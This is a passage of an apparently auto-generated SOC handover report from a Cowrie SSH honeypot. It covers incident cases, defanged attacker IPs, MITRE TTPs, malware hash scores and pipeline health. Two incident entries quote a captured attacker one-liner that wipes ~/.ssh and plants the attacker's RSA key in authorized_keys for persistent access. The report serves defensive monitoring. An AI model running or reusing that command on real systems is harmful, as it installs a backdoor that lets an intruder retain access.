| `2026-06-07 20:54:23` | `cowrie.log.closed` |
| `2026-06-07 20:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.182[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.158.182[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8130270fd055

| Field | Detail |
|---|---|
| **Source IP** | `186.158.182[.]21` |
| **First Seen** | 2026-06-07 20:54 |
| **Last Seen** | 2026-06-07 20:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 20:54:29` | `cowrie.session.connect` |
| `2026-06-07 20:54:29` | `cowrie.client.version` |
| `2026-06-07 20:54:29` | `cowrie.client.kex` |
| `2026-06-07 20:54:32` | `cowrie.login.success` |
| `2026-06-07 20:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.182[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.158.182[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42e9507d1148

| Field | Detail |
|---|---|
| **Source IP** | `151.252.84[.]225` |
| **First Seen** | 2026-06-07 20:56 |
| **Last Seen** | 2026-06-07 20:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 20:56:42` | `cowrie.session.connect` |
| `2026-06-07 20:56:42` | `cowrie.client.version` |
| `2026-06-07 20:56:43` | `cowrie.client.kex` |
| `2026-06-07 20:56:43` | `cowrie.login.success` |
| `2026-06-07 20:56:44` | `cowrie.session.params` |
| `2026-06-07 20:56:44` | `cowrie.command.input` |
| `2026-06-07 20:56:44` | `cowrie.command.failed` |
| `2026-06-07 20:56:44` | `cowrie.log.closed` |
| `2026-06-07 20:56:44` | `cowrie.session.params` |
| `2026-06-07 20:56:44` | `cowrie.command.input` |
| `2026-06-07 20:56:45` | `cowrie.session.file_download` |
| `2026-06-07 20:56:45` | `cowrie.log.closed` |
| `2026-06-07 20:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.252.84[.]225` to AbuseIPDB if not already reported
- [ ] Block `151.252.84[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c538e115d43

| Field | Detail |
|---|---|
| **Source IP** | `151.252.84[.]225` |
| **First Seen** | 2026-06-07 20:56 |
| **Last Seen** | 2026-06-07 20:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 20:56:47` | `cowrie.session.connect` |
| `2026-06-07 20:56:47` | `cowrie.client.version` |
| `2026-06-07 20:56:48` | `cowrie.client.kex` |
| `2026-06-07 20:56:48` | `cowrie.login.success` |
| `2026-06-07 20:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.252.84[.]225` to AbuseIPDB if not already reported
- [ ] Block `151.252.84[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e5bee443b7c

| Field | Detail |
|---|---|
| **Source IP** | `186.158.182[.]21` |
| **First Seen** | 2026-06-07 20:57 |
| **Last Seen** | 2026-06-07 20:58 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 20:57:45` | `cowrie.session.connect` |
| `2026-06-07 20:57:45` | `cowrie.client.version` |
| `2026-06-07 20:57:46` | `cowrie.client.kex` |
| `2026-06-07 20:57:48` | `cowrie.login.success` |
| `2026-06-07 20:57:49` | `cowrie.session.params` |
| `2026-06-07 20:57:49` | `cowrie.command.input` |
| `2026-06-07 20:57:49` | `cowrie.command.failed` |
| `2026-06-07 20:57:51` | `cowrie.log.closed` |
| `2026-06-07 20:57:52` | `cowrie.session.params` |
| `2026-06-07 20:57:52` | `cowrie.command.input` |
| `2026-06-07 20:57:52` | `cowrie.session.file_download` |
| `2026-06-07 20:57:52` | `cowrie.log.closed` |
| `2026-06-07 20:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.182[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.158.182[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e99711317abd

| Field | Detail |
|---|---|
| **Source IP** | `186.158.182[.]21` |
| **First Seen** | 2026-06-07 20:57 |
| **Last Seen** | 2026-06-07 20:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 20:57:58` | `cowrie.session.connect` |
| `2026-06-07 20:57:58` | `cowrie.client.version` |
| `2026-06-07 20:57:59` | `cowrie.client.kex` |
| `2026-06-07 20:58:02` | `cowrie.login.success` |
| `2026-06-07 20:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.182[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.158.182[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.189.235[.]114` | **19** | 2026-06-07 19:29 | 2026-06-07 20:07 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.158.182[.]21` | **14** | 2026-06-07 20:25 | 2026-06-07 21:14 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `125.39.11[.]27` | **13** | 2026-06-07 19:30 | 2026-06-07 19:38 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `143.198.80[.]171` | **13** | 2026-06-07 19:29 | 2026-06-07 21:11 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `64.207.185[.]5` | **13** | 2026-06-07 19:34 | 2026-06-07 20:22 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `202.141.65[.]5` | **11** | 2026-06-07 19:27 | 2026-06-07 19:31 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.81.140[.]174` | **5** | 2026-06-07 19:44 | 2026-06-07 21:01 | 1m | 0 | `T1592` | 🟢 LOW |
| `47.84.106[.]235` | **3** | 2026-06-07 19:37 | 2026-06-07 19:38 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `101.200.236[.]207` | 1 | 2026-06-07 19:39 | 2026-06-07 19:39 | 3s | 0 | `T1592` | 🟢 LOW |
| `115.190.181[.]18` | 1 | 2026-06-07 20:22 | 2026-06-07 20:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.159.39[.]226` | 1 | 2026-06-07 20:48 | 2026-06-07 20:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.95[.]175` | 1 | 2026-06-07 20:16 | 2026-06-07 20:17 | 94s | 0 | `T1592` | 🟢 LOW |
| `151.252.84[.]225` | 1 | 2026-06-07 20:56 | 2026-06-07 20:56 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `208.112.107[.]54` | 1 | 2026-06-07 21:14 | 2026-06-07 21:14 | 33s | 0 | `T1592` | 🟢 LOW |
| `52.190.183[.]82` | 1 | 2026-06-07 21:17 | 2026-06-07 21:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.185.75[.]244` | 1 | 2026-06-07 20:26 | 2026-06-07 20:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `143.198.80[.]171` | SG | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `208.112.107[.]54` | US | Shoes That Fit | **100** ⚠️ | 2 |
| `64.207.185[.]5` | US | GoDaddy.com, LLC | **100** ⚠️ | 4 |
| `14.29.196[.]194` | CN | CHINANET Guangdong province network | **100** ⚠️ | 5 |
| `125.39.11[.]27` | CN | China Unicom Tianjin province network | **100** ⚠️ | 50 |
| `103.189.235[.]114` | SG | Cloud Host Pte Ltd | **100** ⚠️ | 8 |
| `202.141.65[.]5` | IN | RailTel Corporation is an Internet Service Provider. | **100** ⚠️ | 3 |
| `101.200.236[.]207` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `117.159.39[.]226` | CN | China Mobile Communications Corporation | **100** ⚠️ | 20 |
| `151.252.84[.]225` | RU | Tele-plus LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 90 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 59 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 29 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 22 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 11 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 141 cases |
| Tool 34  | Credential Extractor        | ✅ 89 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (9.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 29 priority case(s) shown individually · 16 recon entry/entries in table (8 group(s) consolidating 91 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-07T21:18:37Z_
